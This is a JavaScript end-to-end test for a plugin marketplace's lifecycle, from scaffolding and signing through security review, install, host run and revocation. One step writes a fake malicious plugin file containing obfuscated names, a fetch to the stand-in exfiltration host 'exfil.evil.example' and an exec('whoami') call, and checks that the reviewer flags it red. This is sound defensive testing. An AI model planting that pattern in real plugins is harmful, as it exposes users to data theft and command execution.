import assert from "node:assert/strict";
import { generateKeyPairSync } from "node:crypto";
import { cpSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { after, test } from "node:test";
import { fileURLToPath } from "node:url";
import { scaffold } from "../../packages/create-plugin/src/index.mjs";
import { startHost } from "../../packages/plugin-base/src/host/kernel.mjs";
import {
  applyRevocationsToDir,
  check,
  generateSigningKey,
  installPackage,
  loadSigningKey,
  pack,
} from "../../packages/plugin-cli/src/index.mjs";
import {
  mergeRevoked,
  openIndex,
  openRevoked,
  publicKeyOf,
  selectVersions,
  signCommit,
  signText,
  verifyVersionSignature,
} from "../../packages/plugin-market/src/index.mjs";
import { review } from "../../packages/plugin-review/src/index.mjs";
import { timersV1 } from "../../packages/plugin-services/src/index.mjs";

const CREATE_PLUGIN_ROOT = fileURLToPath(new URL("../../packages/create-plugin", import.meta.url));
const scratch = mkdtempSync(join(tmpdir(), "fuyu-phase5-e2e-"));
after(() => rmSync(scratch, { recursive: true, force: true }));

function makeEd25519Key() {
  const { privateKey } = generateKeyPairSync("ed25519");
  const privPem = privateKey.export({ type: "pkcs8", format: "pem" });
  return { privateKey: privPem, ...publicKeyOf(privPem) };
}

function linkDevDependencies(dir) {
  const { devDependencies } = JSON.parse(readFileSync(join(dir, "package.json"), "utf8"));
  for (const [name, spec] of Object.entries(devDependencies)) {
    const source = spec.startsWith("file:") ? spec.slice("file:".length) : join(CREATE_PLUGIN_ROOT, "node_modules", name);
    const target = join(dir, "node_modules", name);
    mkdirSync(dirname(target), { recursive: true });
    symlinkSync(realpathSync(source), target, "junction");
  }
}

test("Phase 5 lifecycle E2E: scaffold -> check -> pack/sign -> review -> market index -> install -> host run -> upgrade & revoke", async () => {
  const projectDir = join(scratch, "pomodoro-v1");
  const { options } = scaffold({
    owner: "ann",
    name: "pomodoro-e2e",
    displayName: "Pomodoro E2E",
    displayNameZh: "番茄钟端到端",
    dir: projectDir,
  });
  linkDevDependencies(options.dir);

  const checkResult = await check(options.dir, { allowExperimental: false });
  assert.equal(checkResult.ok, true, JSON.stringify(checkResult.errors));

  const keyFile = join(scratch, "author.key");
  const authorKey = generateSigningKey({ file: keyFile });
  const loadedKey = loadSigningKey({ file: keyFile });
  const packedV1 = await pack(options.dir, {
    outDir: join(scratch, "dist-v1"),
    signingKey: loadedKey.privateKey,
  });
  assert.equal(packedV1.manifest.name, "@ann/pomodoro-e2e");
  assert.equal(packedV1.manifest.version, "0.1.0");
  assert.equal(packedV1.signedBy, authorKey.keyId);

  const commitV1 = "1111111111111111111111111111111111111111";
  const commitSigV1 = signCommit(
    {
      name: "@ann/pomodoro-e2e",
      version: "0.1.0",
      repository: "https://github.com/ann/pomodoro-e2e",
      commit: commitV1,
    },
    loadedKey.privateKey,
  );

  const firstReview = review({
    oldDir: null,
    newDir: options.dir,
    newBuilt: packedV1.outDir,
  });
  assert.equal(firstReview.firstRelease, true);
  assert.equal(firstReview.tier, "yellow");
  assert.equal(firstReview.findings.some((f) => f.tier === "red"), false);

  const maliciousDir = join(scratch, "pomodoro-v2-malicious");
  cpSync(options.dir, maliciousDir, { recursive: true });
  const pkgV2 = JSON.parse(readFileSync(join(maliciousDir, "package.json"), "utf8"));
  pkgV2.version = "0.1.1";
  writeFileSync(join(maliciousDir, "package.json"), `${JSON.stringify(pkgV2, null, 2)}\n`);
  writeFileSync(
    join(maliciousDir, "src", "host.ts"),
    [
      'import { exec } from "node:child_process";',
      'const _0xabc1 = "https://exfil.evil.example/collect";',
      "const _0xabc2 = _0xabc1;",
      "const _0xabc3 = _0xabc2;",
      "export function apply() {",
      "  void fetch(_0xabc3);",
      '  exec("whoami");',
      "}",
      "",
    ].join("\n"),
  );
  const maliciousReview = review({
    oldDir: options.dir,
    newDir: maliciousDir,
  });
  assert.equal(maliciousReview.tier, "red");
  assert.ok(maliciousReview.summary.nodeApis.added.includes("child_process"));
  assert.ok(maliciousReview.summary.network.undeclared.includes("exfil.evil.example"));
  assert.ok(maliciousReview.findings.some((f) => f.check === "sensitive" && f.kind === "child-process"));
  assert.ok(maliciousReview.findings.some((f) => f.check === "obfuscation" && f.kind === "obfuscator-names"));

  const indexKey = makeEd25519Key();
  const revocationKey = makeEd25519Key();
  const trust = {
    index: [{ keyId: indexKey.keyId, publicKey: indexKey.publicKey }],
    revocation: [{ keyId: revocationKey.keyId, publicKey: revocationKey.publicKey }],
  };

  const versionEntryV1 = {
    version: "0.1.0",
    repository: "https://github.com/ann/pomodoro-e2e",
    commit: commitV1,
    engines: { fuyu: ">=0.1.0" },
    platforms: ["windows", "macos"],
    url: "https://github.com/TixXin/fuyu-plugins/releases/download/ann-pomodoro-e2e-0.1.0/ann-pomodoro-e2e-0.1.0.fuyu",
    sha256: packedV1.sha256,
    size: packedV1.size,
    publishedAt: "2026-11-10T00:00:00Z",
    reviewedAt: "2026-11-10T01:00:00Z",
    authorSignature: { keyId: commitSigV1.keyId, signature: commitSigV1.signature },
    manifest: {
      displayName: packedV1.manifest.fuyu.displayName,
      description: packedV1.manifest.fuyu.description,
      license: packedV1.manifest.license,
      categories: packedV1.manifest.fuyu.categories,
      nodeApis: packedV1.manifest.fuyu.nodeApis,
      network: packedV1.manifest.fuyu.network ?? [],
      provides: packedV1.manifest.fuyu.provides ?? [],
      replaces: packedV1.manifest.fuyu.replaces ?? [],
      slots: packedV1.manifest.fuyu.slots ?? [],
      inject: {
        required: packedV1.manifest.fuyu.inject?.required ?? [],
        optional: packedV1.manifest.fuyu.inject?.optional ?? [],
      },
      commands: packedV1.manifest.fuyu.commands ?? [],
    },
    icon: {
      url: "https://github.com/TixXin/fuyu-plugins/releases/download/ann-pomodoro-e2e-0.1.0/icon.svg",
      sha256: "a".repeat(64),
    },
  };

  const pluginEntry = {
    name: "@ann/pomodoro-e2e",
    publisher: { github: "ann", official: false, verified: { via: "github" } },
    authorKeys: [{ keyId: authorKey.keyId, publicKey: authorKey.publicKey }],
    versions: [versionEntryV1],
  };

  assert.equal(verifyVersionSignature(pluginEntry, versionEntryV1), authorKey.keyId);

  const indexDoc = {
    format: 3,
    serial: 1,
    revokedSerial: 1,
    generatedAt: "2026-11-15T00:00:00Z",
    expires: "2026-11-22T00:00:00Z",
    plugins: [pluginEntry],
  };
  const indexText = JSON.stringify(indexDoc);
  const indexSig = signText(indexText, indexKey.privateKey);
  const openedIndex = openIndex({
    text: indexText,
    signature: indexSig,
    trust,
    now: new Date("2026-11-16T00:00:00Z"),
  });
  assert.equal(openedIndex.status, "ok");

  const selection = selectVersions(openedIndex.doc.plugins[0], {
    fuyuVersion: "2.0.0",
    platform: "macos",
    now: new Date("2026-11-16T00:00:00Z"),
  });
  assert.equal(selection.install?.entry.version, "0.1.0");
  assert.equal(selection.install?.fresh, false);

  const hostDir = join(scratch, "host-data");
  mkdirSync(hostDir, { recursive: true });
  const installed = installPackage(packedV1.file, {
    dir: hostDir,
    source: "market",
    expectedSha256: versionEntryV1.sha256,
  });
  assert.equal(installed.id, "@ann/pomodoro-e2e");
  assert.equal(installed.version, "0.1.0");

  const host = await startHost({ dir: hostDir, appVersion: "2.0.0" });
  try {
    await host.settle();
    const waitingState = host.status().find((p) => p.id === "@ann/pomodoro-e2e");
    assert.equal(waitingState?.state, "waiting");
    assert.deepEqual(waitingState?.waitingFor, ["timers/v1"]);

    const timerProvider = host.ctx.services.provide(timersV1, {
      list: async () => ({ timers: [], at: Date.now() }),
      start: async () => ({ id: "t1" }),
      pause: async () => {},
      resume: async () => {},
      extend: async () => {},
      remove: async () => {},
      dismissRinging: async () => {},
      adopt: async () => [],
    });
    await host.settle();

    const runningState = host.status().find((p) => p.id === "@ann/pomodoro-e2e");
    assert.equal(runningState?.state, "running");
    assert.equal(runningState?.source, "market");
    await timerProvider.dispose();
  } finally {
    await host.stop();
  }

  const revokedDoc = {
    format: 3,
    serial: 2,
    generatedAt: "2026-11-16T02:00:00Z",
    expires: "2027-02-14T02:00:00Z",
    entries: [
      {
        id: "revoke-pomodoro-010",
        name: "@ann/pomodoro-e2e",
        version: "0.1.0",
        level: "disable",
        reason: { "zh-CN": "安全撤下测试", en: "Security revocation test" },
      },
    ],
    withdrawn: [],
  };
  const revokedText = JSON.stringify(revokedDoc);
  const revokedSig = signText(revokedText, revocationKey.privateKey);
  const openedRevoked = openRevoked({
    text: revokedText,
    signature: revokedSig,
    trust,
    now: new Date("2026-11-16T03:00:00Z"),
  });
  assert.equal(openedRevoked.status, "ok");

  const merged = mergeRevoked(null, openedRevoked.doc);
  assert.equal(merged.ok, true);
  const disabledResult = applyRevocationsToDir(hostDir, merged.state);
  assert.deepEqual(disabledResult.disabled, ["@ann/pomodoro-e2e"]);

  const hostAfterRevoke = await startHost({ dir: hostDir, appVersion: "2.0.0" });
  try {
    await hostAfterRevoke.settle();
    const stateAfterRevoke = hostAfterRevoke.status().find((p) => p.id === "@ann/pomodoro-e2e");
    assert.equal(stateAfterRevoke?.state, "disabled");
  } finally {
    await hostAfterRevoke.stop();
  }
});
